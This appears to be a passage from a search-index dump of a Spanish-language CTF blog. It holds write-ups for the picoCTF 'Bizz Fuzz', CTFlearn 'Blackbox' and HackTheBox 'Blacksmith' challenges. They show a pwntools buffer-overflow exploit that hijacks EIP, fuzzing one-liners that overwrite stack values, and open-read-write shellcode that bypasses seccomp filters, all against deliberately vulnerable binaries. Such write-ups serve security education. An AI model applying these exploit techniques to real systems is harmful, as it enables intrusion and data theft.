0x24, stdin); } if (local_10 == 8) { fgets(local_42, 8, stdin); } if (local_10 != 9 \u0026amp;\u0026amp; local_10 != 10) { if (local_10 == 0xb) { fgets(local_42, 0x10, stdin); } if (local_10 != 0xc) { if (local_10 == 0xd) { fgets(local_42, 0x31, stdin); } if (local_10 == 0xe) { fgets(local_42, 0x1c, stdin); } if (local_10 != 0xf) { if (local_10 == 0x10) { fgets(local_42, 0x13, stdin); } if (local_10 == 0x11) { fgets(local_42, 0x1d, stdin); } if (local_10 != 0x12) { if (local_10 == 0x13) { fgets(local_42, 0x2c, stdin); } if (local_10 != 0x14 \u0026amp;\u0026amp; local_10 != 0x15) { if (local_10 == 0x16) { fgets(local_42, 0x18, stdin); } if (local_10 == 0x17) { fgets(local_42, 0x1a, stdin); } if (local_10 != 0x18 \u0026amp;\u0026amp; local_10 != 0x19) { if (local_10 == 0x1a) { fgets(local_42, 0x1a, stdin); } if (local_10 != 0x1b) { if (local_10 == 0x1c) { fgets(local_42, 9, stdin); } if (local_10 == 0x1d) { fgets(local_42, 6, stdin); } if (local_10 != 0x1e) { if (local_10 == 0x1f) { fgets(local_42, 0x32, stdin); } if (local_10 == 0x20) { fgets(local_42, 0x27, stdin); } } } } } } } } } } } }  Si llegamos a una de estas funciones, tendremos espacio adicional para introducir datos. Sin embargo, tomando esta función como ejemplo, local_42 tiene un buffer de 50 bytes, y ninguna de las llamadas a fgets lee más de 50 bytes, por lo que no hay buffer overflow.\nComo hay muchas funciones raras que utilizan fgets y el reto dice que hay un buffer overflow, tiene que haber por lo menos una función donde fgets se llame con más bytes de los que tiene reservados la variable local.\nPara encontrar la función vulnerable, exporté todo el código descompilado en C desde Ghidra (vuln.c) y usé un script en Python para extraer las líneas que empiezan por char local_ o contengan fgets(local_. Después, saqué el tamaño del buffer reservado para la variable local y el número de bytes leídos por fgets mediante expresiones regulares. Si el buffer leído por fgets es mayor que el reservado, existe buffer overflow, y por tanto, podemos mostrar el nombre de la función vulnerable.\nEste es el script en Python:\n#!/usr/bin/env python3 import re def main(): with open('vuln.c') as f: all_lines = f.read().splitlines() lines = [] for i, line in enumerate(all_lines): if line.startswith(' char local_') or 'fgets(local_' in line: lines.append((i, line.strip())) print('Parsed lines. Total:', len(lines), '/', len(all_lines)) i = 0 while i \u0026lt; len(lines): n, line = lines[i] if 'char local' in line: buffer = int(re.findall(r'char local_.. \\[(\\d+?)\\];', line)[0]) i += 1 _, next_line = lines[i] while 'fgets(local' in next_line and i \u0026lt; len(lines): used_buffer_str = re.findall( r'fgets\\(local_..,([x0-9a-f]+?),.*?\\);', next_line)[0] used_buffer = int( used_buffer_str, 16 if 'x' in used_buffer_str else 10) if used_buffer \u0026gt; buffer: print('Reserved:', buffer, 'B. Used:', used_buffer, 'B') print('Function name:', all_lines[n - 3]) i += 1 if i \u0026lt; len(lines): _, next_line = lines[i] if __name__ == '__main__': main()  Si lo ejecutamos, descubrimos el nombre de la función vulnerable:\n$ python3 find_bof.py Parsed lines. Total: 20369 / 119248 Reserved: 87 B. Used: 348 B Function name: void FUN_0808ae73()  Ahora podemos ir a Ghidra, encontrarla y renombrarla como has_bof:\nvoid has_bof() { char local_67[87]; int local_10; local_10 = get_some_data(0x14); if (local_10 == 1) { fgets(local_67, 0x15c, stdin); } if (local_10 == 2) { fgets(local_67, 0x3e, stdin); } // more stuff }  Aquí está la vulnerabilidad de Buffer Overflow, ya que el buffer reservado es de 87 bytes y fgets está leyendo hasta 348 bytes (0x15c).\nAhora necesitamos encontrar referencias a esta función, y solamente hay una función rara: FUN_08109f08. A esta la llamé calls_has_bof:\nvoid calls_has_bof() { char local_67[87]; int local_10; local_10 = get_some_data(0x2e); if (local_10 == 1) { fgets(local_67, 0x44, stdin); } if (local_10 == 2) { fgets(local_67, 0x1c, stdin); } if (local_10 != 3) { if (local_10 == 4) { fgets(local_67, 0x43, stdin); } if (local_10 == 5) { has_bof(); } // more stuff } }  Para poder llegar a has_bof desde call_has_bof necesitamos que get_some_data(0x2e) devuelva 5 (es decir, tenemos que perder el juego de FizzBuzz en el número 5).\nAhora podemos buscar referencias a calls_has_bof, y tenemos una función extraña FUN_081313b8, cuyo nombre será calls_calls_has_bof (no la muestro porque la referencia a la función se encuentra en \u0026ldquo;profundidad 22\u0026rdquo;, lo explicaré más adelante).\nDespués, buscamos referencias a la funcióncalls_calls_has_bof, y tenemos otra función extraña: FUN_08143ffd, que pasó a llamarse calls_calls_calls_has_bof. La referencia a la función está en \u0026ldquo;profundidad 1\u0026rdquo;:\nvoid calls_calls_calls_has_bof() { int iVar1; iVar1 = get_some_data(0x11); if (iVar1 != 0x11) { FUN_0811ead2(); iVar1 = get_some_data(5); if (iVar1 != 5) { calls_calls_has_bof(); iVar1 = get_some_data(0xf); // more stuff } } }  Supongo que ya se entiende lo que quiere decir \u0026ldquo;profundidad 1\u0026rdquo;: una vez en la función calls_calls_calls_has_bof, necesitamos entrar al bloque if (perdiendo en FizzBuzz), salir de la función extraña FUN_0811ead2 (ganando FizzBuzz) y entrar en el segundo bloque if (perdiendo en FizzBuzz) para poder entrar en calls_calls_has_bof.\nPor tanto, \u0026ldquo;profundidad 2\u0026rdquo; significa que tenemos que pasar una función extraña (en este caso, FUN_0811ead2).\nPodemos continuar buscando referencias a calls_calls_calls_has_bof. Aquí encontramos cuatro funciones extrañas, por lo que podemos elegir FUN_0813ca30, que fue renombrada a calls_calls_calls_calls_has_bof (como no podía ser de otra manera). Esta tiene \u0026ldquo;profundidad 8\u0026rdquo;.\nFinalmente, si buscamos referencias a calls_calls_calls_calls_has_bof, llegamos al main:\nvoid main() { setbuf(stdout,(char *)0x0); FUN_0811d5b3(); FUN_0811d941(); puts(\"fizz\"); FUN_0811ead2(); puts(\"buzz\"); puts(\"fizz\"); FUN_0811fbb3(); FUN_08120828(); puts(\"fizz\"); puts(\"buzz\"); FUN_08121d33(); puts(\"fizz\"); FUN_08122908(); FUN_08122ea8(); puts(\"fizzbuzz\"); FUN_081237e9(); FUN_081241ca(); puts(\"fizz\"); FUN_081255ef(); puts(\"buzz\"); puts(\"fizz\"); FUN_08127392(); FUN_08127c08(); puts(\"fizz\"); puts(\"buzz\"); FUN_081294b8(); puts(\"fizz\"); FUN_0812a7b4(); FUN_0812b0ae(); puts(\"fizzbuzz\"); FUN_0812c368(); FUN_0812c6f6(); puts(\"fizz\"); FUN_0812d430(); puts(\"buzz\"); puts(\"fizz\"); FUN_0812edb3(); FUN_0812f1b9(); puts(\"fizz\"); puts(\"buzz\"); FUN_081309d7(); puts(\"fizz\"); FUN_08131dba(); FUN_08132072(); puts(\"fizzbuzz\"); FUN_0813282a(); FUN_0813326e(); puts(\"fizz\"); FUN_08133b70(); puts(\"buzz\"); puts(\"fizz\"); FUN_08135115(); FUN_081355d3(); puts(\"fizz\"); puts(\"buzz\"); FUN_08137124(); puts(\"fizz\"); FUN_08137f92(); FUN_08138931(); puts(\"fizzbuzz\"); FUN_0813979b(); FUN_08139ba1(); puts(\"fizz\"); FUN_0813ac2a(); puts(\"buzz\"); puts(\"fizz\"); calls_calls_calls_calls_has_bof(); // more stuff }  Perfecto. Por el momento, hemos descubierto la función a la que queremos llamar (print_flag), la función vulnerable (has_bof) y el camino a seguir para llegar a dicha función. Ahora necesitamos automatizar el proceso.\nPrimero, debemos automatizar la llegada a calls_calls_calls_calls_has_bof dentro del main:\nmessages = [...] def pass_messages(p): while len(messages): data = p.recvuntil(b'? ').decode().splitlines() if len(data) \u0026gt;= 2: if data[0] != messages.pop(0): log.error('Unexpected message') if len(data) == 3: if data[1] != messages.pop(0): log.error('Unexpected message') number = int(data[-1].rstrip('? ')) p.sendline(answer(number))  La función pass_messages utiliza una lista de mensajes esperados (los datos uqe se imprimen por el programa: \u0026ldquo;fizz\u0026rdquo;, \u0026ldquo;buzz\u0026rdquo;, \u0026ldquo;fizz\u0026rdquo;, \u0026ldquo;fizz\u0026rdquo;, \u0026ldquo;buzz\u0026rdquo;, \u0026ldquo;fizz\u0026rdquo;, \u0026ldquo;fizzbuzz\u0026rdquo;\u0026hellip; hasta llegar a calls_calls_calls_calls_has_bof, en orden).\nLa forma de verificar que todo está correcto es cogiendo los datos recibidos del proceso p y quitar los mensajes esperados de la lista si coinciden (si no, es que algo está mal). La tarea se mantiene hasta que no hay más mensajes en la lista.\nLa función answer se encarga del juego de FizzBuzz:\ndef answer(n: int) -\u0026gt; bytes: if n % 15 == 0: return b'fizzbuzz' if n % 3 == 0: return b'fizz' if n % 5 == 0: return b'buzz' return str(n).encode()  Una vez pasados los mensajes, entramos en la función calls_calls_calls_calls_has_bof.\nPara entrar en la siguiente función (calls_calls_calls_has_bof), necesitamos pasar 8 funciones extrañas (\u0026ldquo;produndidad 8\u0026rdquo;). Vamos a definir esta funcionalidad:\ndef get_number(p) -\u0026gt; int: return int(p.recvuntil(b'? ').decode().rstrip('? ')) def pass_function(p): number = get_number(p) p.sendline(answer(number)) while (number := get_number(p)) != 1: p.sendline(answer(number)) def pass_functions(p, depth: int): p.sendlineafter(b'? ', b'0') for _ in range(depth): pass_function(p) p.sendline(b'0') log.info(f'Passed {depth} function' + ('s' if depth \u0026gt; 1 else ''))  Básicamente, lo que hace la función pass_functions es el proceso mostrado anteriormente con el ejemplo de \u0026ldquo;profundidad 1\u0026rdquo;. Enviamos un 0 para perder el juego de FizzBuzz, luego ganamos el siguiente juego y perdemos el siguiente. Esta tarea se repite depth veces, para conseguir entrar en la función deseada.\nResumiendo:\n calls_calls_calls_calls_has_bof llama a calls_calls_calls_has_bof en \u0026ldquo;profundidad 8\u0026rdquo; calls_calls_calls_has_bof llama a calls_calls_has_bof en \u0026ldquo;profundidad 1\u0026rdquo; calls_calls_has_bof llama a calls_has_bof en \u0026ldquo;profundidad 22\u0026rdquo; calls_has_bof llama a has_bof si get_some_data devuelve 5 has_bof llama al fgets vulnerable si get_some_data devuelve 1  Entonces, podemos escribir esta función main para el exploit de Python:\ndef main(): p = get_process() pass_messages(p) log.info('Passed messages') pass_functions(p, 8) pass_functions(p, 1) pass_functions(p, 22) for i in range(4): p.sendlineafter(b'? ', answer(i + 1)) p.sendlineafter(b'? ', b'0') log.info('Arrived to vulnerable fgets()') p.interactive(prompt='')  Ya podemos empezar con el proceso de explotación. Si ejecutamos el script deberíamos llegar al fgets vulnerable:\n$ python3 solve.py [+] Starting local process './vuln': pid 495650 [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [*] Switching to interactive mode 1? 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [*] Got EOF while reading in interactive [*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 495650) [*] Got EOF while sending in interactive  Perfecto, violación de segmento (SIGSEGV). Cabe mencionar que puse un 0 y 8 espacios antes de los caracteres A (porque la función get_some_data lee hasta 9 bytes).\nVamos a agregar GDB al proceso para calcular el offset necesario para controlar $eip. Para parar en el fgets vulnerable, podemos encontrar la dirección de la instrucción que llama a get_some_data dentro de has_bof en Ghidra (0x0808ae8a). Esto se puede añadir como script de GDB mediante pwntools:\ngdb.attach(p, gdbscript='break *0x0808ae8a\\ncontinue')  Si lo ejecutamos ahora, el script de Python llamará a GDB:\n$ python3 solve.py [+] Starting local process './vuln': pid 496748 [*] running in new terminal: ['/usr/bin/gdb', '-q', './vuln', '496748', '-x', '/tmp/pwngwheh6z6.gdb'] [+] Waiting for debugger: Done [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [*] Switching to interactive mode  Y ahora que tenemos el control en GDB, podemos crear el patrón:\ngef➤ pattern create 200 [+] Generating a pattern of 200 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab [+] Saved as '$_gef0' gef➤ continue  Y devolvemos el control al script de Python. Podemos introducir el 0, los 8 espacios y luego el patrón:\n$ python3 solve.py [+] Starting local process './vuln': pid 496748 [*] running in new terminal: ['/usr/bin/gdb', '-q', './vuln', '496748', '-x', '/tmp/pwngwheh6z6.gdb'] [+] Waiting for debugger: Done [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [*] Switching to interactive mode 1? 0 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab  Y obtenemos la violación de segmento. Vamos a ver GDB:\ngef➤ pattern create 200 [+] Generating a pattern of 200 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab [+] Saved as '$_gef0' gef➤ continue Continuing. Program received signal SIGSEGV, Segmentation fault. 0x61617961 in ?? ()  En este punto, podemos obtener el offset necesario para controlar el registro $eip:\ngef➤ pattern offset $eip [+] Searching for '$eip' [+] Found at offset 95 (little-endian search) likely [+] Found at offset 94 (big-endian search)  Por tanto, necesitamos 95 caracteres para llegar a $eip. Ahora, podemos añadir la dirección de print_flag (0x08048656, que es estática porque no hay protección PIE) al payload:\ndef main(): p = get_process() pass_messages(p) log.info('Passed messages') pass_functions(p, 8) pass_functions(p, 1) pass_functions(p, 22) for i in range(4): p.sendlineafter(b'? ', answer(i + 1)) p.sendlineafter(b'? ', b'0') log.info('Arrived to vulnerable fgets()') offset = 95 junk = b'A' * offset print_flag_addr = 0x08048656 payload = junk + p32(print_flag_addr) p.sendlineafter(b'? ', b'0' + b' ' * 8 + payload) log.success(f'Flag: {p.recvline().decode()}') p.close()  Vamos a probarlo en local (necesitamos crear un archivo flag.txt falso):\n$ echo THISISTHEFLAG  flag.txt $ python3 solve.py [+] Starting local process './vuln': pid 504168 [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [+] Flag: THISISTHEFLAG [*] Process './vuln' stopped with exit code 0 (pid 504168)  Perfecto, vamos a lanzarlo a la instancia remota (tarda alrededor de un minuto):\n$ python3 solve.py mercury.picoctf.net 62213 [+] Opening connection to mercury.picoctf.net on port 62213: Done [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [+] Flag: picoCTF{y0u_found_m3} [*] Closed connection to mercury.picoctf.net port 62213  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/bizz-fuzz/","section":"ctf","summary":"picoCTF 2021. 500 puntos. Binario de 32 bits. Ingeniería inversa. Largo camino hasta un Buffer Overflow oculto. Control del flujo de ejecución del programa","time":14,"title":"Bizz Fuzz"},{"contents":"Se nos proporciona un servidor al que conectarnos por SSH. Existe un binario llamado blackbox que es SGID:\nblackbox@ubuntu-512mb-nyc3-01:~$ ls -l total 16 ---x--s--x 1 root blackbox_pwn 8936 Jan 31 2019 blackbox -r--r----- 1 root blackbox_pwn 33 Oct 9 2017 flag.txt blackbox@ubuntu-512mb-nyc3-01:~$ file blackbox blackbox: setgid executable, regular file, no read permission  Como se puede ver, no tenemos permisos de lectura, por lo que no podemos transferir el archivo a nuestra máquina, ni descompilarlo, ni depurarlo. Lo único que podemos hacer es ejecutarlo:\nblackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox What is 1 + 1 =  Solamente tenemos una entrada de usuario. Si respondemos a la pregunta, tenemos:\nblackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox What is 1 + 1 = 2 No dummy... 1 + 1 != 0...  Si aplicamos fuzzing con Python, obtenemos un mensaje *** stack smashing detected ***:\nblackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 100)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... *** stack smashing detected ***: \u0026lt;unknown\u0026gt; terminated [1]+ Stopped python3 -c 'print(\"A\" * 100)' | ./blackbox  Por tanto, el binario tiene un stack canary que protege de posibles buffer overflows. Podemos disminuir la cantidad de caracteres hasta que encontramos este comportamiento:\nblackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 80)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 0... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 81)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 65... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 82)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 16705... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 83)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 4276545... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 84)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 85)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 86)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 87)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 88)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 89)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... *** stack smashing detected ***: \u0026lt;unknown\u0026gt; terminated [2]+ Stopped python3 -c 'print(\"A\" * 89)' | ./blackbox  Si tomamos los números y los mostramos en hexadecimal, vemos que ocurre lo siguiente:\n\u0026gt;\u0026gt;\u0026gt; hex(65) '0x41' \u0026gt;\u0026gt;\u0026gt; hex(16705) '0x4141' \u0026gt;\u0026gt;\u0026gt; hex(4276545) '0x414141' \u0026gt;\u0026gt;\u0026gt; hex(1094795585) '0x41414141'  Parece claro que el resultado que tenemos que introducir es \u0026quot;\\x02\u0026quot; donde hay una sola \u0026quot;A\u0026quot; (0x41). Es decir, necesitamos poner 80 caracteres y el siguiente tiene que ser \u0026quot;\\x02\u0026quot;, de manera que la pregunta se responde correctamente:\nblackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 80 + \"\\x02\")' | ./blackbox What is 1 + 1 = CORRECT! You get flag: CTFlearn{0n3_4lus_1_1s_Tw0_dumm13!!} [3]+ Stopped python3 -c 'print(\"A\" * 80 + \"\\x02\")' | ./blackbox  Y una manera más corta:\nblackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"\\x02\" * 81)' | ./blackbox What is 1 + 1 = CORRECT! You get flag: CTFlearn{0n3_4lus_1_1s_Tw0_dumm13!!} [3]+ Stopped python3 -c 'print(\"\\x02\" * 81)' | ./blackbox  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/ctflearn/binary/blackbox/","section":"ctf","summary":"Pruebas de caja negra. Sin depuración, sin código fuente, sin ensamblador","time":2,"title":"Blackbox"},{"contents":"Se nos proporciona un binario de 64 bits llamado blacksmith:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments  Si lo abrimos en Ghidra, veremos esta función main:\nvoidmain() { size_tlength; longin_FS_OFFSET; intanswer; intoption; char*message_1; char*message_2; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); setup(); message_1 =\"You are worthy to carry this Divine Weapon and bring peace to our homeland!\\n\"; message_2 =\"This in not a weapon! Do not try to mock me!\\n\"; puts(\"Traveler, I need some materials to fuse in order to create something really powerful!\"); printf(\"Do you have the materials I need to craft the Ultimate Weapon?\\n1. Yes, everything is here! \\n2. No, I did not manage to bring them all!\\n\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;answer); if(answer !=1) { puts(\"Farewell traveler! Come back when you have all the materials!\"); /* WARNING: Subroutine does not return */ exit(0x22); } printf(\u0026amp;menu); __isoc99_scanf(\"%d\", \u0026amp;option); sec(); if(option ==1) { sword(); } elseif(option ==2) { shield(); } elseif(option ==3) { bow(); } else{ length =strlen(message_2); write(1, message_2, length); /* WARNING: Subroutine does not return */ exit(0x105); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Muestra un menú con varias opciones:\n$ ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 2 Farewell traveler! Come back when you have all the materials! $ ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 1 What do you want me to craft? 1. 🗡 2. 🛡 3. 🏹 \u0026gt; 1 This sword can cut through anything! The only thing is, that it is too heavy carry it.. zsh: invalid system call ./blacksmith $ ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 1 What do you want me to craft? 1. 🗡 2. 🛡 3. 🏹 \u0026gt; 3 This bow's range is the best! Too bad you do not have enough materials to craft some arrows too.. zsh: invalid system call ./blacksmith $ ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 1 What do you want me to craft? 1. 🗡 2. 🛡 3. 🏹 \u0026gt; 2 Excellent choice! This luminous shield is empowered with Sun's light! ☀ It will protect you from any attack and it can reflect enemies attacks back! Do you like your new weapon? \u0026gt; yes zsh: segmentation fault ./blacksmith  La única opción en la que podemos introducir datos es shield (opción 2):\nvoidshield() { size_tlength; longin_FS_OFFSET; undefined shellcode [72]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); length =strlen(message); write(1, message, length); length =strlen(\"Do you like your new weapon?\\n\u0026gt; \"); write(1, \"Do you like your new weapon?\\n\u0026gt; \", length); read(0, shellcode, 63); (*(code *) shellcode)(); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Básicamente, tenemos la oportunidad de introducir instrucciones en código máquina para que se ejecuten. Podemos introducir hasta 63 bytes. Sin embargo, estamos limitados por sec, que implementa reglas seccomp para permitir instrucciones syscall específicas:\nvoidsec() { undefined8 rules; longin_FS_OFFSET; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); prctl(0x26, 1); prctl(4, 0); rules =seccomp_init(0); seccomp_rule_add(rules, 0x7fff0000, 2, 0); seccomp_rule_add(rules, 0x7fff0000, 0, 0); seccomp_rule_add(rules, 0x7fff0000, 1, 0); seccomp_rule_add(rules, 0x7fff0000, 0x3c, 0); seccomp_load(rules); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Para enumerar estas reglas seccomp, podemos usar seccomp-tools:\n$ seccomp-tools dump ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 1 What do you want me to craft? 1. 🗡 2. 🛡 3. 🏹 \u0026gt; 2 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002 if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL  Entonces, nos permiten usar sys_read, sys_write, sys_open y sys_exit. Existen varias páginas web en las que se listan todas las instrucciones syscall de Linux x86_64 con los parámetros y registros necesarios. Por ejemplo, esta.\nCon las instrucciones syscall permitidas, podemos abrir el archivo de la flag (flag.txt) con sys_open, leer el descriptor de archivo con sys_read y escribir su contenido al descriptor de archivo stdout con sys_write. Adicionalmente, podemos salir con sys_exit.\nEntonces, sys_openat necesita la siguiente configuración de registros:\n $rax = 2 $rdi tiene un puntero al nombre del archivo $rsi tiene unas flags $rdx tiene el modo de operación (este se puede omitir)  Específicamente, podemos mirar en man7.org y aprender más sobre el significado de los parámetros:\nintopen(constchar*pathname, intflags);  Una vez que tengamos sys_open configurado, recibiremos el descriptor de archivo del archivo de la flag como valor de retorno en $rax. Aquí será cuando usemos sys_read:\n $rax = 0 $rdi tiene el descriptor de archivo (el que devuelve sys_open) $rsi tiene la dirección en la que se guardarán los contenidos leídos $rdx tiene el número de bytes a leer (por ejemplo, 100)  ssize_tread(intfd, void*buf, size_tcount); Finalmente, escribiremos el contenido a stdout mediante sys_write:\n $rax = 1 $rdi tiene el descriptor de archivo (1 para stdout) $rsi tiene la dirección desde la que se cogerán los contenidos a escribir $rdx tiene el número de bytes a escribir (por ejemplo, 100)  ssize_twrite(intfd, constvoid*buf, size_tcount);  Para gente que nunca ha escrito en ensamblador, puede ser útil escribir un programa en C con la configuración anterior, compilarlo y analizar el código ensamblador generado:\n#include\u0026lt;fcntl.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; voidmain() { intfd; chardata[256]; fd =open(\"./flag.txt\", O_RDONLY); read(fd, data, 100); write(1, data, 100); exit(0); }  $ gcc test.c -O3 -o test test.c: In function ‘main’: test.c:10:2: warning: ignoring return value of ‘read’, declared with attribute warn_unused_result [-Wunused-result] 10 | read(fd, data, 100); | ^~~~~~~~~~~~~~~~~~~ test.c:11:2: warning: ignoring return value of ‘write’, declared with attribute warn_unused_result [-Wunused-result] 11 | write(1, data, 100); | ^~~~~~~~~~~~~~~~~~~ ┌──(rocky⚡️rocky-pwn)-[~/…/HTB/Challenges/Pwn/Blacksmith] └─$ ./test HTB{f4k3_fl4g_f0r_t3st1ng}  Ese es el código ensamblador generado (optimizado debido a la opción -O3 de gcc). Este shellcode se conoce con el nombre de open-read-write:\n$ objdump -M intel --disassemble=main test test: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000010c0 \u0026lt;main\u0026gt;: 10c0: f3 0f 1e fa endbr64 10c4: 55 push rbp 10c5: 31 f6 xor esi,esi 10c7: 48 8d 3d 36 0f 00 00 lea rdi,[rip+0xf36] # 2004 \u0026lt;_IO_stdin_used+0x4\u0026gt; 10ce: 48 81 ec 10 01 00 00 sub rsp,0x110 10d5: 64 48 8b 04 25 28 00 mov rax,QWORD PTR fs:0x28 10dc: 00 00 10de: 48 89 84 24 08 01 00 mov QWORD PTR [rsp+0x108],rax 10e5: 00 10e6: 31 c0 xor eax,eax 10e8: 48 89 e5 mov rbp,rsp 10eb: e8 b0 ff ff ff call 10a0 \u0026lt;open@plt\u0026gt; 10f0: ba 64 00 00 00 mov edx,0x64 10f5: 48 89 ee mov rsi,rbp 10f8: 89 c7 mov edi,eax 10fa: e8 91 ff ff ff call 1090 \u0026lt;read@plt\u0026gt; 10ff: bf 01 00 00 00 mov edi,0x1 1104: ba 64 00 00 00 mov edx,0x64 1109: 48 89 ee mov rsi,rbp 110c: e8 6f ff ff ff call 1080 \u0026lt;write@plt\u0026gt; 1111: 31 ff xor edi,edi 1113: e8 98 ff ff ff call 10b0 \u0026lt;exit@plt\u0026gt; Disassembly of section .fini:  Esto está bien, pero ahora hay que hacer lo mismo con instrucciones syscall:\npush rsi mov rdi, 'flag.txt' # as hexadecimal number push rdi mov rdi, rsp mov al, 2 syscall mov dl, 0x64 mov rsi, rsp xor edi, eax xor al, al syscall mov al, 1 mov rdi, rax syscall mov al, 0x3c syscall  Nótese cómo puse $rdi como puntero a \u0026quot;flag.txt\\0\u0026quot;, y también cómo los registros para sys_write siguen configurados de la anterior instrucción sys_read. También, optimicé el uso de los registros para que el shellcode generado fuera más corto.\nSi introducimos el shellcode anterior en el programa blacksmith, obtendremos la flag:\n$ python3 solve.py 134.209.26.70:31965 [*] './blacksmith' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments [+] Opening connection to 134.209.26.70 on port 31965: Done [+] HTB{s3cc0mp_1s_t00_s3cur3} [*] Closed connection to 134.209.26.70 port 31965  El exploit completo se puede encontrar aquí: 